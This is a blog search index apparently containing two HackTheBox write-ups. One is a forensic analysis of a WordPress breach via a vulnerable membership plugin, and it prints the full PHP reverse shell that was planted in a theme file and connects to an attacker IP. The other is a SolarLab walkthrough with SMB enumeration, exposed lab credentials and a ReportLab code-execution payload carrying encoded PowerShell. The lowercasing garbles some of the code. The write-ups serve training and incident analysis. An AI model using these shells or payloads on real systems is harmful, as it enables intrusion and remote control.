
{
    
    
    
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
    "pages": [{"date":"2024-05-27","image":"","imageAlt":"","link":"http://localhost:1313/posts/htb-sherlocks/ultimatum/","summary":"Ultimatum (DFIR) Scenario One of the Forela WordPress servers was a target of notorious Threat Actors (TA). The website was running a blog dedicated to the Forela Social Club, where Forela employees can chat and discuss random topics.","tags":["CVE-2023-3460","dfir","htb","linux","LinuxCatScale","member","plugin","sherlock","ultimate","ultimatum","worpress"],"text":"ultimatum (dfir) scenario one of the forela wordpress servers was a target of notorious threat actors (ta). the website was running a blog dedicated to the forela social club, where forela employees can chat and discuss random topics. unfortunately, it became a target of a threat group. the soc team believes this was due to the blog running a vulnerable plugin. the it admin already followed the acquisition playbook and triaged the server for the security team. ultimately (no pun intended) it is your responsibility to investigate the incident. step in and confirm the culprits behind the attack and restore this important service within the forela environment.\nforensics artifacts we are given an archive ultimatum.zip with a sha256sum:101ae8258f9a2a821bdc78e4f2b61deb2337cffb95e58c4dfe8cd4e57ca75a66.\nupon extracting the archive use extract-cat-scale.sh we get the following artifacts:\n-rwxrwxrwx 1 root root 1732 aug 8 2023 ip-172-31-11-131-20230808-0937-console-error-log.txt docker: total 0 logs: total 488 -rwxrwxrwx 1 root root 451801 aug 8 2023 ip-172-31-11-131-20230808-0937-last-btmp.txt -rwxrwxrwx 1 root root 329 aug 8 2023 ip-172-31-11-131-20230808-0937-last-utmp.txt -rwxrwxrwx 1 root root 606 aug 8 2023 ip-172-31-11-131-20230808-0937-last-utmpdump.txt -rwxrwxrwx 1 root root 732 aug 8 2023 ip-172-31-11-131-20230808-0937-last-wtmp.txt -rwxrwxrwx 1 root root 2397 aug 8 2023 ip-172-31-11-131-20230808-0937-lastlog.txt -rwxrwxrwx 1 root root 396 aug 8 2023 ip-172-31-11-131-20230808-0937-passwd-check.txt -rwxrwxrwx 1 root root 12 aug 8 2023 ip-172-31-11-131-20230808-0937-var-crash-list.txt -rwxrwxrwx 1 root root 115 aug 8 2023 ip-172-31-11-131-20230808-0937-var-crash.tar.gz -rwxrwxrwx 1 root root 2975 aug 8 2023 ip-172-31-11-131-20230808-0937-var-log-list.txt -rwxrwxrwx 1 root root 291 aug 8 2023 ip-172-31-11-131-20230808-0937-who.txt -rwxrwxrwx 1 root root 360 aug 8 2023 ip-172-31-11-131-20230808-0937-whoandwhat.txt drwxrwxrwx 12 root root 4096 may 27 10:10 varlogs misc: total 74804 -rwxrwxrwx 1 root root 559 aug 8 2023 ip-172-31-11-131-20230808-0937-setuid-setguid-tools.txt -rwxrwxrwx 1 root root 62 aug 8 2023 ip-172-31-11-131-20230808-0937-dev-dir-files-hashes.txt -rwxrwxrwx 1 root root 92 aug 8 2023 ip-172-31-11-131-20230808-0937-dev-dir-files.txt -rwxrwxrwx 1 root root 384887 aug 8 2023 ip-172-31-11-131-20230808-0937-exec-perm-files.txt -rwxrwxrwx 1 root root 34211795 aug 8 2023 ip-172-31-11-131-20230808-0937-full-timeline.csv -rwxrwxrwx 1 root root 41585177 aug 8 2023 ip-172-31-11-131-20230808-0937-pot-webshell-first-1000.txt -rwxrwxrwx 1 root root 392840 aug 8 2023 ip-172-31-11-131-20230808-0937-pot-webshell-hashes.txt persistence: total 116 drwxrwxrwx 2 root root 4096 may 27 10:10 crontabs -rwxrwxrwx 1 root root 120 aug 8 2023 ip-172-31-11-131-20230808-0937-cron-folder-list.txt -rwxrwxrwx 1 root root 147 aug 8 2023 ip-172-31-11-131-20230808-0937-cron-tab-list.txt -rwxrwxrwx 1 root root 45449 aug 8 2023 ip-172-31-11-131-20230808-0937-persistence-systemdlist.txt -rwxrwxrwx 1 root root 775 aug 8 2023 ip-172-31-11-131-20230808-0937-service_status.txt -rwxrwxrwx 1 root root 27513 aug 8 2023 ip-172-31-11-131-20230808-0937-systemctl_all.txt -rwxrwxrwx 1 root root 23761 aug 8 2023 ip-172-31-11-131-20230808-0937-systemctl_service_status.txt podman: total 0 process_and_network: total 5008 drwxrwxrwx 3 root root 4096 may 27 10:10 cyberjunkie_admin -rwxrwxrwx 1 root root 671 aug 8 2023 ip-172-31-11-131-20230808-0937-ip-a.txt -rwxrwxrwx 1 root root 439 aug 8 2023 ip-172-31-11-131-20230808-0937-iptables-numerical.txt -rwxrwxrwx 1 root root 275 aug 8 2023 ip-172-31-11-131-20230808-0937-iptables.txt -rwxrwxrwx 1 root root 0 aug 8 2023 ip-172-31-11-131-20230808-0937-lsof-list-open-files.txt -rwxrwxrwx 1 root root 5474 aug 8 2023 ip-172-31-11-131-20230808-0937-process-cmdline.txt -rwxrwxrwx 1 root root 148446 aug 8 2023 ip-172-31-11-131-20230808-0937-process-details.txt -rwxrwxrwx 1 root root 28377 aug 8 2023 ip-172-31-11-131-20230808-0937-process-environment.txt -rwxrwxrwx 1 root root 11080 aug 8 2023 ip-172-31-11-131-20230808-0937-process-exe-links.txt -rwxrwxrwx 1 root root 111180 aug 8 2023 ip-172-31-11-131-20230808-0937-process-fd-links.txt -rwxrwxrwx 1 root root 1241355 aug 8 2023 ip-172-31-11-131-20230808-0937-process-map_files-link-hashes.txt -rwxrwxrwx 1 root root 3463139 aug 8 2023 ip-172-31-11-131-20230808-0937-process-map_files-links.txt -rwxrwxrwx 1 root root 11524 aug 8 2023 ip-172-31-11-131-20230808-0937-processes-axwwso.txt -rwxrwxrwx 1 root root 2991 aug 8 2023 ip-172-31-11-131-20230808-0937-processhashes.txt -rwxrwxrwx 1 root root 211 aug 8 2023 ip-172-31-11-131-20230808-0937-routetable.txt -rwxrwxrwx 1 root root 49785 aug 8 2023 ip-172-31-11-131-20230808-0937-ss-anepo.txt -rwxrwxrwx 1 root root 190 aug 8 2023 ip-172-31-11-131-20230808-0937-ssh-folders-list.txt drwxrwxrwx 3 root root 4096 may 27 10:10 root drwxrwxrwx 3 root root 4096 may 27 10:10 ubuntu system_info: total 340 drwxrwxrwx 30 root root 4096 may 27 10:10 etc-modified-files -rwxrwxrwx 1 root root 1968 aug 8 2023 ip-172-31-11-131-20230808-0937-cpuinfo.txt -rwxrwxrwx 1 root root 76 aug 8 2023 ip-172-31-11-131-20230808-0937-deb-package-verify.txt -rwxrwxrwx 1 root root 104466 aug 8 2023 ip-172-31-11-131-20230808-0937-deb-packages.txt -rwxrwxrwx 1 root root 1126 aug 8 2023 ip-172-31-11-131-20230808-0937-df.txt -rwxrwxrwx 1 root root 54667 aug 8 2023 ip-172-31-11-131-20230808-0937-dmesg.txt -rwxrwxrwx 1 root root 0 aug 8 2023 ip-172-31-11-131-20230808-0937-etc-key-files-list.txt -rwxrwxrwx 1 root root 4990 aug 8 2023 ip-172-31-11-131-20230808-0937-etc-modified-files-list.txt -rwxrwxrwx 1 root root 38 aug 8 2023 ip-172-31-11-131-20230808-0937-host-date-timezone.txt -rwxrwxrwx 1 root root 1863 aug 8 2023 ip-172-31-11-131-20230808-0937-lsmod.txt -rwxrwxrwx 1 root root 0 aug 8 2023 ip-172-31-11-131-20230808-0937-lsusb.txt -rwxrwxrwx 1 root root 1391 aug 8 2023 ip-172-31-11-131-20230808-0937-meminfo.txt -rwxrwxrwx 1 root root 112329 aug 8 2023 ip-172-31-11-131-20230808-0937-modinfo.txt -rwxrwxrwx 1 root root 5151 aug 8 2023 ip-172-31-11-131-20230808-0937-module-sha1.txt -rwxrwxrwx 1 root root 4348 aug 8 2023 ip-172-31-11-131-20230808-0937-mount.txt -rwxrwxrwx 1 root root 2446 aug 8 2023 ip-172-31-11-131-20230808-0937-procmod.txt -rwxrwxrwx 1 root root 526 aug 8 2023 ip-172-31-11-131-20230808-0937-release.txt -rwxrwxrwx 1 root root 4570 aug 8 2023 ip-172-31-11-131-20230808-0937-sudo.txt user_files: total 8 drwxrwxrwx 5 root root 4096 may 27 10:10 hidden-user-home-dir -rwxrwxrwx 1 root root 315 aug 8 2023 hidden-user-home-dir-list.txt virsh: total 0 tools visual studio code sublime text editor linuxcatscale to extract the archive. analysis the web server was apache v2.4.41-4ubuntu3.14 and it was running wordpress v6.2.2 on ubuntu 20.04.6 lts (focal fossa) with a kernel version of 5.15.0-1036-aws.\nthe server was triaged and we were provided artifacts following the acquisition playbook. because this was an attack on the webserver most of the analysis for initial foothold will revolve around analyzing the access.log.\nfrom the access log, we see a lot of http requests coming in and out of the server from an ip 23.106.60.163 with the user agent wpscan v3.8.24 (https://wpscan.com/wordpress-security-scanner). the ta used this ip to scan forella\u0026rsquo;s wordpress blog for vulnerabilities.\nwpscanner is an automated security auditing tool for wordpress. it scans the wordpress version and its plugins. themes and various other components to check for known vulnerabilities or weaknesses.\nthe log shows that the ta was successful in identifying a vulnerable plugin. it was ultimate-member - user profile, registration, login, member directory, content restriction \u0026amp; membership plugin, the version that was installed on forella\u0026rsquo;s wordpress site was v2.6.4.\naccording to mitre - the ultimate member wordpress plugin before 2.6.7 does not prevent visitors from creating user accounts with arbitrary capabilities, effectively allowing attackers to create administrator accounts at will. this is actively being exploited in the wild. the cve assigned was cve-2023-3460 with a cvss (v3.x) base score of 9.8 critical. the exploit for this cve was publicly available at the time of the attack.\nafter identifying the vulnerability, the ta used a poc published on github by a security research firm named secragon. it was confirmed by analyzing the script\u0026rsquo;s user agents which were python-requests/2.28.1 and secragon offensive agen.\ntherefore, successfully creating an admin user named secragon the ta switched his ip to 198.16.74.45 and manually browsed the admin dashboard. we can confirm this by their user agent mozilla/5.0 (windows nt 10.0; win64; x64; rv:109.0) gecko/20100101 firefox/116.0.\nto get a foothold on the server the ta created a malicious theme, which served as a reverse shell to perform remote command execution. they created the file here /var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php. the code for the reverse shell is below.\n\u0026lt;?php // php-reverse-shell - a reverse shell implementation in php. comments stripped to slim it down. re: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php // copyright (c) 2007 pentestmonkey@pentestmonkey.net set_time_limit (0); $version = \u0026#34;1.0\u0026#34;; $ip = \u0026#39;43.204.24.76\u0026#39;; $port = 6969; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = \u0026#39;uname -a; w; id; /bin/bash -i\u0026#39;; $daemon = 0; $debug = 0; if (function_exists(\u0026#39;pcntl_fork\u0026#39;)) { $pid = pcntl_fork(); if ($pid == -1) { printit(\u0026#34;error: can\u0026#39;t fork\u0026#34;); exit(1); } if ($pid) { exit(0); // parent exits } if (posix_setsid() == -1) { printit(\u0026#34;error: can\u0026#39;t setsid()\u0026#34;); exit(1); } $daemon = 1; } else { printit(\u0026#34;warning: failed to daemonise. this is quite common and not fatal.\u0026#34;); } chdir(\u0026#34;/\u0026#34;); umask(0); // open reverse connection $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(\u0026#34;$errstr ($errno)\u0026#34;); exit(1); } $descriptorspec = array( 0 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;r\u0026#34;), // stdin is a pipe that the child will read from 1 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;), // stdout is a pipe that the child will write to 2 =\u0026gt; array(\u0026#34;pipe\u0026#34;, \u0026#34;w\u0026#34;) // stderr is a pipe that the child will write to ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(\u0026#34;error: can\u0026#39;t spawn shell\u0026#34;); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(\u0026#34;successfully opened reverse shell to $ip:$port\u0026#34;); while (1) { if (feof($sock)) { printit(\u0026#34;error: shell connection terminated\u0026#34;); break; } if (feof($pipes[1])) { printit(\u0026#34;error: shell process terminated\u0026#34;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(\u0026#34;sock read\u0026#34;); $input = fread($sock, $chunk_size); if ($debug) printit(\u0026#34;sock: $input\u0026#34;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(\u0026#34;stdout read\u0026#34;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(\u0026#34;stdout: $input\u0026#34;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(\u0026#34;stderr read\u0026#34;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(\u0026#34;stderr: $input\u0026#34;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print \u0026#34;$string\\n\u0026#34;; } } ?\u0026gt; from this code we can see the c2 server 43.204.24.76:6969 and the command uname -a; w; id; /bin/bash -i the web shell executed on behalf of the ta. first, the web shell created a process with pid 234471 to execute the shell\u0026rsquo;s payload. then for /bin/bash -i command it created an interactive bash shell with the pid 234517.\nwww-data 234517 234471 2616 596 ? s 09:01 00:00:00 sh -c uname -a; w; id; /bin/bash -i www-data 234521 234517 4248 3444 ? s 09:01 00:00:00 /bin/bash -i to elevate the shell\u0026rsquo;s privilege the attacker used a bash script linenum.sh to enumerate potential privilege escalation vectors. the ta uploaded linenum.sh to /tmp and then /dev/shm directory.\n7,1,/dev/shm/linenum.sh,2023-08-08 09:33:05.917203555 +0000,2023-08-08 09:32:38.650234799 +0000,2023-08-08 09:32:46.345943752 +0000,-,www-data,www-data,-rwxrwxrwx,46631 and they were successful in gaining root access. from the auth.log we see that the ta logged into ssh using ubuntu user\u0026rsquo;s private ssh key using another ip 203.101.190.9. then escalate their privilege to root using su.\nimmediately after that, the threat actor created an account cyberjunkie_admin for persistence.\naug 7 13:50:25 ip-172-31-11-131 sshd[229515]: accepted publickey for ubuntu from 203.101.190.9 port 42564 ssh2: rsa sha256:c/25gw2hce4yy/6f4ead5o1dvdgebtufkoevah7kmzk aug 7 13:50:25 ip-172-31-11-131 sshd[229515]: pam_unix(sshd:session): session opened for user ubuntu by (uid=0) aug 7 13:50:25 ip-172-31-11-131 systemd-logind[523]: new session 1971 of user ubuntu. aug 7 13:50:31 ip-172-31-11-131 sudo: ubuntu : tty=pts/0 ; pwd=/home/ubuntu ; user=root ; command=/usr/bin/su aug 7 13:50:31 ip-172-31-11-131 sudo: pam_unix(sudo:session): session opened for user root by ubuntu(uid=0) aug 7 13:50:31 ip-172-31-11-131 su: (to root) ubuntu on pts/0 aug 7 13:50:31 ip-172-31-11-131 su: pam_unix(su:session): session opened for user root by ubuntu(uid=0) aug 7 13:53:08 ip-172-31-11-131 sshd[126847]: received sighup; restarting. aug 7 13:53:08 ip-172-31-11-131 sshd[126847]: server listening on 0.0.0.0 port 22. aug 7 13:53:08 ip-172-31-11-131 sshd[126847]: server listening on :: port 22. aug 7 13:55:36 ip-172-31-11-131 groupadd[229659]: group added to /etc/group: name=cyberjunkie_admin, gid=1001 aug 7 13:55:36 ip-172-31-11-131 groupadd[229659]: group added to /etc/gshadow: name=cyberjunkie_admin aug 7 13:55:36 ip-172-31-11-131 groupadd[229659]: new group: name=cyberjunkie_admin, gid=1001 aug 7 13:55:36 ip-172-31-11-131 useradd[229665]: new user: name=cyberjunkie_admin, uid=1001, gid=1001, home=/home/cyberjunkie_admin, shell=/bin/bash, from=/dev/pts/0 aug 7 13:55:58 ip-172-31-11-131 passwd[229677]: pam_unix(passwd:chauthtok): password changed for cyberjunkie_admin aug 7 13:56:18 ip-172-31-11-131 chfn[229679]: changed user \u0026#39;cyberjunkie_admin\u0026#39; information aug 7 13:59:25 ip-172-31-11-131 su: (to cyberjunkie_admin) ubuntu on pts/0 aug 7 13:59:25 ip-172-31-11-131 su: pam_unix(su:session): session opened for user cyberjunkie_admin by ubuntu(uid=0) closely examining the sudoers permission file we found a very risky configuration that allowed the ubuntu user to perform tasks as root without authentication.\n# created by cloud-init v. 23.1.2-0ubuntu0~20.04.1 on wed, 12 jul 2023 11:41:45 +0000 # user rules for ubuntu ubuntu all=(all) nopasswd:all timeline reconnaissance: on 2023-08-08 08:21:27 the ta started the scanner using ip 23.106.60.163.\nweaponization \u0026amp; delivery: on 2023-08-08 08:32:50 the ta identified the vulnerable wordpress plugin ultimate member v2.6.4.\nexploitation: on 2023-08-08 08:33:58 the ta successfully exploited cve-2023-3460 and added an admin user secragon.\ninstallation: on 2023-08-08 08:58:02 the ta created a reverse web shell /var/www/html/wp-content/themes/twentytwentythree/patterns/hidden-comments.php. the ta did this from an ip 198.16.74.45. after that, on 2023-08-08 09:06:53 the ta uploaded a bash script linenum.sh inside the /tmp folder then he moved it to the /dev/shm on 2023-08-08 09:32:38.\ncommand and control: the ta used ip 43.204.24.76 and port 6969 as a c2 server.\nremarks analyzing the log file indicates that the server was already compromised on 2023-08-07 13:50:25 by another threat actor who logged into the ssh account of ubuntu user from ip 203.101.190.9 using ssh key and created a backdoor admin account cyberjunkie_admin on 2023-08-07 13:55:36. the account seems to be dormant but that ta (203.101.190.9) also compromised the mysql database.\n","title":"HTB Sherlock Ultimatum"},{"date":"2024-05-16","image":"","imageAlt":"","link":"http://localhost:1313/posts/htb-machines/solarlab/","summary":"Solar Lab - HTB Nmap PORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack nginx 1.24.0 | http-methods: |_ Supported Methods: GET HEAD |_http-title: SolarLab Instant Messenger |_http-server-header: nginx/1.24.0 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 445/tcp open microsoft-ds?","tags":["ctf","CVE-2023-32315","CVE-2023-33733","decryptor","htb","lab","openfire","PDF library","ReportLab","share","smb","solar","windows"],"text":"solar lab - htb nmap port state service reason version 80/tcp open http syn-ack nginx 1.24.0 | http-methods: |_ supported methods: get head |_http-title: solarlab instant messenger |_http-server-header: nginx/1.24.0 135/tcp open msrpc syn-ack microsoft windows rpc 139/tcp open netbios-ssn syn-ack microsoft windows netbios-ssn 445/tcp open microsoft-ds? syn-ack 6791/tcp open http syn-ack nginx 1.24.0 | http-methods: |_ supported methods: get head post options |_http-server-header: nginx/1.24.0 |_http-title: did not follow redirect to http://report.solarlab.htb:6791/ service info: os: windows; cpe: cpe:/o:microsoft:windows host script results: | smb2-time: | date: 2024-05-14t14:01:13 |_ start_date: n/a |_clock-skew: -5m11s | smb2-security-mode: | 3:1:1: |_ message signing enabled but not required | p2p-conficker: | checking for conficker.c or higher... | check 1 (port 64857/tcp): clean (timeout) | check 2 (port 37138/tcp): clean (timeout) | check 3 (port 48381/udp): clean (timeout) | check 4 (port 52237/udp): clean (timeout) |_ 0/4 checks are positive: host is clean or ports are blocked http enumeration http://report.solarlab.htb:6791\nunfortunately couldn\u0026rsquo;t log in, no credential was available.\nsmb enumeration message signing enabled but not required.\n$ smbclient --no-pass -l //10.10.11.16 sharename type comment --------- ---- ------- admin$ disk remote admin c$ disk default share documents disk ipc$ ipc remote ipc documents share was interesting so let\u0026rsquo;s connect and list the contents of it.\n$ smbclient --no-pass //10.10.11.16/documents try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir . dr 0 fri apr 26 16:47:14 2024 .. dr 0 fri apr 26 16:47:14 2024 concepts d 0 fri apr 26 16:41:57 2024 desktop.ini ahs 278 fri nov 17 10:54:43 2023 details-file.xlsx a 12793 fri nov 17 12:27:21 2023 my music dhsrn 0 thu nov 16 19:36:51 2023 my pictures dhsrn 0 thu nov 16 19:36:51 2023 my videos dhsrn 0 thu nov 16 19:36:51 2023 old_leave_request_form.docx a 37194 fri nov 17 10:35:57 2023 7779839 blocks of size 4096. 1885790 blocks available smb: \\\u0026gt; there are some document files stored in the share. let\u0026rsquo;s download them and analyze.\nexif metadata analysis old_leave_request_form.docx\nexiftool version number : 12.76 file name : old_leave_request_form.docx directory : . file size : 37 kb file modification date/time : 2024:05:14 17:16:22+02:00 file access date/time : 2024:05:14 17:20:03+02:00 file inode change date/time : 2024:05:14 17:16:22+02:00 file permissions : -rw-r--r-- file type : docx file type extension : docx mime type : application/vnd.openxmlformats-officedocument.wordprocessingml.document zip required version : 20 zip bit flag : 0x0006 zip compression : deflated zip modify date : 1980:01:01 00:00:00 zip crc : 0x5c9ce90a zip compressed size : 483 zip uncompressed size : 2460 zip file name : [content_types].xml _newreviewcycle : creator : alison melville last modified by : jackie revision number : 3 create date : 2015:07:06 22:19:00z modify date : 2015:08:03 16:50:00z template : normal total edit time : 1 minute pages : 1 words : 142 characters : 814 application : microsoft office word doc security : none lines : 6 paragraphs : 1 scale crop : no heading pairs : title, 1 titles of parts : company : greig melville associates limited links up to date : no characters with spaces : 955 shared doc : no hyperlinks changed : no app version : 14.0000 details-file.xlsx\nexiftool version number : 12.76 file name : details-file.xlsx directory : . file size : 13 kb file modification date/time : 2024:05:14 17:16:11+02:00 file access date/time : 2024:05:14 17:21:24+02:00 file inode change date/time : 2024:05:14 17:16:11+02:00 file permissions : -rw-r--r-- file type : xlsx file type extension : xlsx mime type : application/vnd.openxmlformats-officedocument.spreadsheetml.sheet zip required version : 20 zip bit flag : 0x0006 zip compression : deflated zip modify date : 1980:01:01 00:00:00 zip crc : 0xd125f54a zip compressed size : 388 zip uncompressed size : 1681 zip file name : [content_types].xml creator : college of education last modified by : paul serban create date : 2011:03:24 14:38:51z modify date : 2023:11:17 12:27:21z application : microsoft excel doc security : none scale crop : no heading pairs : worksheets, 3 titles of parts : sheet1, sheet2, sheet3 company : purdue university links up to date : no shared doc : no hyperlinks changed : no app version : 16.0300 msip_label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_enabled: true msip_label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_setdate: 2023-11-17t10:41:19z msip_label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_method: standard msip_label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_name: all employees_2 msip_label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_siteid: 33440fc6-b7c7-412c-bb73-0e70b0198d5a msip_label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_actionid: c1afab2c-84d2-450d-9066-dcc727984137 msip_label_e463cba9-5f6c-478d-9329-7b2295e4e8ed_contentbits: 0 this file contains mip metadata which are part of microsoft information protection sdk - metadata. so it might contain some juicy informations.\ntraining-request-form.docx\nexiftool version number : 12.76 file name : training-request-form.docx directory : . file size : 161 kb file modification date/time : 2024:05:14 17:16:49+02:00 file access date/time : 2024:05:14 17:20:39+02:00 file inode change date/time : 2024:05:14 17:16:49+02:00 file permissions : -rw-r--r-- file type : docx file type extension : docx mime type : application/vnd.openxmlformats-officedocument.wordprocessingml.document zip required version : 20 zip bit flag : 0x0006 zip compression : deflated zip modify date : 1980:01:01 00:00:00 zip crc : 0xd2250c4f zip compressed size : 470 zip uncompressed size : 2223 zip file name : [content_types].xml creator : gayle.rennie last modified by : fryatt, susanne (wgpsn) revision number : 2 create date : 2018:07:20 08:11:00z modify date : 2018:07:20 08:11:00z template : normal.dotm total edit time : 44 minutes pages : 1 words : 188 characters : 1078 application : microsoft office word doc security : none lines : 8 paragraphs : 2 scale crop : no heading pairs : title, 1 titles of parts : company : wood group links up to date : no characters with spaces : 1264 shared doc : no hyperlinks changed : no app version : 14.0000 travel-request-sample.docx\nexiftool version number : 12.76 file name : travel-request-sample.docx directory : . file size : 31 kb file modification date/time : 2024:05:14 17:16:55+02:00 file access date/time : 2024:05:14 17:21:02+02:00 file inode change date/time : 2024:05:14 17:16:55+02:00 file permissions : -rw-r--r-- file type : docx file type extension : docx mime type : application/vnd.openxmlformats-officedocument.wordprocessingml.document zip required version : 20 zip bit flag : 0x0006 zip compression : deflated zip modify date : 1980:01:01 00:00:00 zip crc : 0x7d32bdda zip compressed size : 440 zip uncompressed size : 1997 zip file name : [content_types].xml title : subject : creator : paul squillace keywords : description : last modified by : katy brown revision number : 2 create date : 2015:06:14 14:49:00z modify date : 2015:06:14 14:49:00z template : normal.dotm total edit time : 1 minute pages : 1 words : 351 characters : 2003 application : microsoft macintosh word doc security : read-only enforced lines : 16 paragraphs : 4 scale crop : no heading pairs : title, 1 titles of parts : company : microsoft links up to date : no characters with spaces : 2350 shared doc : no hyperlinks changed : no app version : 14.0000 credentials the details-file.xlsx contained sensitive information.\npassword file\talexander\u0026#39;s ssn\t123-23-5424\tclaudia\u0026#39;s ssn\t820-378-3984\tblake\u0026#39;s ssn\t739-1846-436 site account# username password security question answer email other information amazon.com 101-333 alexander.knight@gmail.com al;ksdhfewoiuh what was your mother\u0026rsquo;s maiden name? blue alexander.knight@gmail.com pefcu a233j kalexander dkjafblkjadsfgl what was your high school mascot pine tree alexander.knight@gmail.com chase alexander.knight@gmail.com d398sadsknr390 what was the name of your first pet? corvette claudia.springer@gmail.com fidelity blake.byte thiscanb3typedeasily1@ what was your mother\u0026rsquo;s maiden name? helena\tblake@purdue.edu signa alexanderk danenacia9234n what was your mother\u0026rsquo;s maiden name? poppyseed muffins alexander.knight@gmail.com account number: 1925-47218-30 claudias dadsfawe9dafkn what was your mother\u0026rsquo;s maiden name? yellow crayon claudia.springer@gmail.com account number: 3872-03498-45 comcast jhg3434 vectren yuio576 verizon 1111-5555-33 with the above credentials i tried to login to the report.solarlab.htb:6791 and found a match. apparently, the username structure for this organization is firstname + lastname initial.\nthe matched credential is:\n**********:thiscanb3typedeasily1@ enumerating the report portal dashboard it was a portal for sending/approving leave request/vacation approval etc. after filling the form and uploading a image for attaching signature, ait generated a pdf file.\nexamining the generated pdf file with exiftool i discovered it was using reportlab pdf library.\nexiftool version number : 12.76 file name : output.pdf directory : . file size : 277 kb file modification date/time : 2024:05:14 19:24:09+02:00 file access date/time : 2024:05:14 19:24:09+02:00 file inode change date/time : 2024:05:14 19:24:09+02:00 file permissions : -rw-r--r-- file type : pdf file type extension : pdf mime type : application/pdf pdf version : 1.4 linearized : no author : (anonymous) create date : 2024:05:14 20:18:13-02:00 creator : (unspecified) modify date : 2024:05:14 20:18:13-02:00 producer : reportlab pdf library - www.reportlab.com subject : (unspecified) title : (anonymous) trapped : false page mode : usenone page count : 1 a quick search for this library resulted in that this library maybe (because i couldn\u0026rsquo;t determine the version of the library) vulnerable to an rce. read more about it on bleepingcomputer.\na publicly available poc was released on github.\nthe vulnerability was due to how it handled converting html to pdf (the flaw in xhtml2pdf).\npoc:\n\u0026lt;para\u0026gt; \u0026lt;font color=\u0026#34;[ [ getattr(pow,word(\u0026#39;__globals__\u0026#39;))[\u0026#39;os\u0026#39;].system(\u0026#39;powershell -e jabjagwaaqblag4adaagad0aiaboaguadwatae8aygbqaguaywb0acaauwb5ahmadablag0algboaguadaauafmabwbjagsazqb0ahmalgbuaemauabdagwaaqblag4adaaoaciamqawac4amqawac4amqa2ac4anaa2acialaa5adaamaaxackaowakahmadabyaguayqbtacaapqagacqaywbsagkazqbuahqalgbhaguadabtahqacgblageabqaoackaowbbagiaeqb0aguawwbdaf0ajabiahkadablahmaiaa9acaamaauac4anga1aduamwa1ahwajqb7adaafqa7ahcaaabpagwazqaoacgajabpacaapqagacqacwb0ahiazqbhag0algbsaguayqbkacgajabiahkadablahmalaagadaalaagacqaygb5ahqazqbzac4atablag4azwb0aggakqapacaalqbuaguaiaawackaewa7acqazabhahqayqagad0aiaaoae4azqb3ac0atwbiagoazqbjahqaiaatafqaeqbwaguatgbhag0azqagafmaeqbzahqazqbtac4avablahgadaauaeeauwbdaekasqbfag4aywbvagqaaqbuagcakqauaecazqb0afmadabyagkabgbnacgajabiahkadablahmalaawacwaiaakagkakqa7acqacwblag4azabiageaywbracaapqagacgaaqblahgaiaakagqayqb0ageaiaayad4ajgaxacaafaagae8adqb0ac0auwb0ahiaaqbuagcaiaapadsajabzaguabgbkagiayqbjagsamgagad0aiaakahmazqbuagqaygbhagmaawagacsaiaaiafaauwagaciaiaaracaakabwahcazaapac4auabhahqaaaagacsaiaaiad4aiaaiadsajabzaguabgbkagiaeqb0aguaiaa9acaakabbahqazqb4ahqalgblag4aywbvagqaaqbuagcaxqa6adoaqqbtaemasqbjackalgbhaguadabcahkadablahmakaakahmazqbuagqaygbhagmaawayackaowakahmadabyaguayqbtac4avwbyagkadablacgajabzaguabgbkagiaeqb0agualaawacwajabzaguabgbkagiaeqb0agualgbmaguabgbnahqaaaapadsajabzahqacgblageabqauaeyabab1ahmaaaaoackafqa7acqaywbsagkazqbuahqalgbdagwabwbzaguakaapaa==\u0026#39;) for word in [orgtypefun(\u0026#39;word\u0026#39;, (str,), { \u0026#39;mutated\u0026#39;: 1, \u0026#39;startswith\u0026#39;: lambda self, x: false, \u0026#39;__eq__\u0026#39;: lambda self,x: self.mutate() and self.mutated \u0026lt; 0 and str(self) == x, \u0026#39;mutate\u0026#39;: lambda self: {setattr(self, \u0026#39;mutated\u0026#39;, self.mutated - 1)}, \u0026#39;__hash__\u0026#39;: lambda self: hash(str(self)) })] ] for orgtypefun in [type(type(1))] ] and \u0026#39;red\u0026#39;\u0026#34;\u0026gt; exploit \u0026lt;/font\u0026gt; \u0026lt;/para\u0026gt; delivery:\nthe justification field is limited by 300 characters so it cannot be used also we cannot attach html file. and the date section is accepts date range. so that leaves ome_office_request parameter to deliver the payload.\nfoothold we got a shell as blake and our user flag.\nprivesc enumeration i found a sqlite database inside the app/instance directory.\nusers.db\n1\tblakeb\tthiscanb3typedeasily1@ 2\tclaudias\t007poiuytrewq 3\talexanderk\thotp!fireguard current user info\nuser information ---------------- user name sid ============== ============================================== solarlab\\blake s-1-5-21-3606151065-2641007806-2768514320-1000 group information ----------------- group name type sid attributes ====================================== ================ ============ ================================================== everyone well-known group s-1-1-0 mandatory group, enabled by default, enabled group builtin\\users alias s-1-5-32-545 mandatory group, enabled by 